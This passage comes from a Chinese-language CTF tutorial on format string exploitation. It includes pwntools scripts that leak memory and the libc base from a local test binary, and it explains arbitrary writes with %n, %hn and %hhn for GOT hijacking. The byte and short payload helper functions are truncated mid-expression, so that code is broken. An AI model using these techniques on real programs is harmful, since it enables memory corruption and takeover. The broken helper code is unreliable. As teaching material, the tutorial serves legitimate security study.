    elf = ELF('./test3')
    libc = elf.libc
    payload = '@@%11$s@@'.ljust(0x28,'a') + p64(0x000000601028)
    raw_input('->')
    io.sendline(payload)
    io.recvuntil('@@')
    print('leak->' +hex(u64(io.recv(6).ljust(8,"\x00"))))
    print('read-libc.symbols->' + hex(libc.symbols['read']))
    io.interactive()
这样就OK了。
##### 小总结
  1. 使用%s 读取内存里的任意位址，%s 会把对应的参数当做 `char*`指标并将目标做为字符串印出来
  2. 使用限制:Stack 上要有可控制 addres 的buffer ;注意由于是当做字符串打印，所以到 0 时就会中断,也要注意32位跟64位address的写在的位置。
##### 小技巧
###### 0x1
想要泄露libc基址，还有就是通过返回`__libc_start_main + x`(libc版本不一样可能会不一样，本人是ubuntu16.04)  
算一下偏移是21。
    from pwn import *
    context.log_level = 'debug'
    io = process('./test3')
    elf = ELF('./test3')
    libc = elf.libc
    payload = '%21$p'.ljust(0x8,'a')
    raw_input('->')
    io.sendline(payload)
    io.recvuntil('0x')
    libc_base = int(io.recv(12),16) - 240 - libc.symbols['__libc_start_main']
    print('leak->' +hex(libc_base))
    io.interactive()
运行这个exp来leak libc的基址：  
成功了。
###### 0x2
泄露stack address ：  
正如图中所示，会发现栈上说有很多与esp接近的数据，利用合适的数据根据偏移就会拿到esp的值，然后就得到了satck
address。常用的也就是多层函数调用时，留下的ebp值。
### 覆盖内存
覆盖内存通常其实就是改写内存，其中分为 **改写栈上的内存和任意地址的内存**
，从而来控制程序的执行流程。（这里我先只记录一下任意地址的覆盖，改写栈上的内存暂时用不到）  
这里面主要是使用`%n`, %n 转换指示符不输出字符，将
当前printf函数已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。其核心就是： **写入的值 = 已经输出的字符数**
，知道这个以后，其 **使用起来就是控制好在这次%n前输出正确的字符数** 。
#### 任意地址覆盖
  * 使用方法类似于%s的任意地址读取，只是换成了%n。
  * 使用%xc的办法来控制输出的字符数。
基本格式： `....[overwrite addr]....%[overwrite offset]$n`  
其中`....` 表示我们的填充内容，`overwrite addr` 表示我们所要覆盖的地址，`overwrite offset`
地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。也就是构造一个需要写入的address，然后用%xxc来控制写入的字符数，然后把握好偏移。
##### fmt字符串写入大小
因为%n在一次的写入是在一次当中写入int大小的整数，当使用%xc来控制输出一个int大小的字符个数，这个printf函数会输出十分大的字符数量，这个结果对我们说十分不利的，一方面远端程序输出以后，自己接收是一个问题，是十分不稳定的，并且无法精准的控制需要修改的地方。  
所以常用的是%hn 和%hhn，分别写入short和char大小的整数，然后分成多次写入以组合成完整的int整数，这个过程是十分稳定的。
##### 单次printf多次写入
在进行GOT hijack或者改掉某一个指标的时候，通常会要求一次printf内就要来改写完成，不然改一半的值这个指标再被使用时程序很容易崩溃。  
所以就可以把多个格式化字符串结合在一次，例如：
    %xc%offset1$hn %yc%offset2$hn address address+2
但这样就说需要小心偏移，并且输出的字符数也要控制好。难点也在控制这个多次写入时，c前面应该填多少的值。
##### 多次写入时控制输出的字符数
要注意的是 **%n写入的值是其前面输出的字符数。**
  1. 第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16.
  2. 之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为`%30c% offset$hhn`
  3. 当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 = 0xD0（208），也就是填入%208c%offset$hhn即可。
当然这也是很规律的，在控制一个输出字符数，就分为3种情况：
  * 前面已经输出的字符数小于这次要输出的字符数
  * 前面已经输出的字符数等于于这次要输出的字符数
  * 前面已经输出的字符数大于这次要输出的字符数
然后就可以写成一个脚本来实现自动化控制这个输出字符数：
单字节：
    # prev 前面已经输出多少字符
    # val 要写入的值
    # idx  偏移
    def fmt_byte(prev,val,idx,byte = 1):
        result = ""
        if prev > 8*i) & 0xff,idx+i) 
        prev = (key >> i*8) & 0xff
双字节：
    #跟上个基本一样，只是改了部分地方
    def fmt_short(prev,val,idx,byte = 2):
        result = ""
        if prev > 16*i) & 0xffff,idx+i) 
        prev = (key >> i*16) & 0xffff
在使用这两个脚本的时候，常用的
**是在获取到payload的时候也用`payload.ljust()`做好padding,来控制好字节对齐，然后再摆上需要写入x组的地址。（一会在题目中会有演示）**
##### pwntools pwnlib.fmtstr 模块
    pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
  * offset (int):你控制的第一个格式化程序的偏移量
  * writes (dict):格式为 {addr: value, addr2: value2},用于往 addr 里写入 value (常用:`{printf_got}`)
  * numbwritten (int):已经由 printf 函数写入的字节数
  * `write_size (str)`:必须是 byte,short 或 int。限制你是要逐 byte 写,逐 short 写还是逐 int 写(hhn,hn或n)
这个函数是十分好用的，具体可以去看一下pwntools的官方介绍，但是实际使用当中，会发现几个问题：
  * 在64位中，并不好用，自动生成的payload中，它不会将地址放在格式化字符串之后，导致用不了。
  * 在面对单次printf，实施多次写入的时候其更显的十分无力。
记录到这里，理论部分就差不多完了，下一篇主要记录的就是题解篇，会包含一些技巧，常见的ctf格式化字符串题目漏洞利用的常见套路，还有格式化字符串漏洞的高级利用（当格式化字符串漏洞的buf在bss上，这就意味着我们无法直接往栈上写地址，该怎么办？并且这种题目常在赛题中出现）